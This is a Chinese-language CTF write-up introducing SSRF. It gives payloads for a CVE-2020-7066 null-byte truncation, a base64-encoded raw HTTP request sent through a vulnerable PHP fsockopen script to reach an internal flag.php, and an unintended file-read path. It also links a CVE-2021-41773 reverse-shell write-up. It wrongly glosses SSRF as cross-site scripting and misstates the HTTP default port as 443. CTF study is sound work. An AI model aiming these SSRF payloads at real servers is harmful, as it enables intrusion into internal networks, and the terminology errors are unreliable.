### 初见SSRF（跨域脚本漏洞）

### 1.原理：

通过公网主机访问内网，攻击内网服务器

![img](https://xzfile.aliyuncs.com/media/upload/picture/20200324095630-ae7ee364-6d72-1.png)

#### 2.应用：

##### （1）最简单的应用： curl www.example.com

例题：

#### [GKCTF 2020]cve版签到

打开即给网站，点击链接给了个，301则猜测此网站在公网的后台执行了：curl(或者可能是ping)内网的活动

尝试修改为ping百度，不行那么很可能必须要包含关键字段：www.ctdhub.com查看漏洞库发现：

###### cve-2020-7066 （%00截断）

###### 影响版本：7.2<=ver<=7.2.29  7.3.0~7.3.16 7.4.0~7.4.4

影响函数：get_header()

###### payload:?url=https://127.0.0.123%00www.ctfhub.com

#### [HNCTF 2022 WEEK2]ez_ssrf

> 先扫描：可以直接找到flag.php,但直接打不行，访问index.php即可得源码：

````php
<?php
highlight_file(__FILE__);
error_reporting(0);
$data=base64_decode($_GET['data']);
$host=$_GET['host'];
$port=$_GET['port'];
$fp=fsockopen($host,intval($port),$error,$errstr,30);
if(!$fp) {
  die();
}
else {
  fwrite($fp,$data);
  while(!feof($data))
  {
    echo fgets($fp,128);
  }
  fclose($fp);
}
````

可以看到，我们要传三个参：$port 要传入数组，$data要传入发送的请求，$host传入网关，fsockopen()是用的套接字符，用于内网中的文件访问。那么这题的用意其实就是SSRF,我们尝试：127.0.0.1:80（http默认是443）至于data则是我们要访问的数据，及请求包

这里的data最好要base64加密，但是我最开始是发现500的：

WA:

````
data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiAxMjcuMC4wLjEKQ29ubmVjdGlvbjogY2xvc2U=
````

而后返回：

````
-Type: text/html; charset=iso-8859-10>

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at 172.2.9.186 Port 80</address>
</body></html>

````

一看，结果是换行符需要‘\r\n’随构造：

AC:

````php
data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=
````

````
 HTTP/1.1 200 OK Date: Thu, 26 Jun 2025 02:08:58 GMT Server: Apache/2.4.38 (Debian) Content-Length: 44 Connection: close Content-Type: text/html; charset=UTF-8 nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}
````

###### [LitCTF 2025]easy_signin

弱口令？见litCTF2025题目复现

###### NSSCTF 2nd MYBox

预期：伪协议+自定义协议+SSRF+CVE-2021-41773

非预期：任意文件读取寻找start.sh 查看注入路径

因为预期解复现总是500，先打个非预期

理由:一般比赛我们会如何注入flag?一般如果是用的dockers，那么我们就有start.sh

sh文件有点类似于Windows中的.bat

``start.sh``

````sh
#!/bin/bash echo $FLAG > /nevvvvvver_f1nd_m3 FLAG=not_here export FLAG=not_here httpd-foreground & python3 /app/app.py
````

很明显的写flag逻辑，直接访问即可

预期：

[[NSSCTF 2nd\] web刷题记录_nssctf don’t have an account? 不给注册!-CSDN博客](https://blog.csdn.net/m0_73512445/article/details/132611093)

[CVE-2021-41773 目录穿越复现并反弹shell-CSDN博客](https://blog.csdn.net/m0_53073183/article/details/135982730)



对于Redis：

暂时没学，不会做。。。

